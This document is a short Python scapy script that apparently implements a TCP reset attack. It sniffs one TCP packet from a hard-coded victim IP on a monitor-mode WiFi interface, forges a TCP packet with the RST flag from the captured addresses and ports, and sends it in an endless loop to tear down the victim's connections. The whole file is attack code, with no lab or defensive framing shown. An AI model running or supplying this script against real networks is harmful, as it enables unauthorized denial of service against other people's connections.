from scapy.all import *


victim_ip = "192.168.1.1"
your_iface = "mon0"

# get a tcp packet by sniffing WiFi
t = sniff(iface=your_iface, count=1,
          lfilter=lambda x: x.haslayer(TCP)
          and x[IP].src == victim_ip)
t = t[0]

ip_dst = t[IP].dst
ip_src = t[IP].src
ip_sport = t[TCP].sport
ip_dport = t[TCP].dport

Layer3 = IP(src=ip_src, dst=ip_dst)
Layer4 = TCP(sport=ip_sport, dport=ip_dport,flags='R')

ResetPacket = Layer3/Layer4

send(ResetPacket, verbose= 0, loop=1)
# tcpdata = {
#     'src': t[IP].src,
#     'dst': t[IP].dst,
#     'sport': t[TCP].sport,
#     'dport': t[TCP].dport,
#     'seq': t[TCP].seq,
#     'ack': t[TCP].ack
# }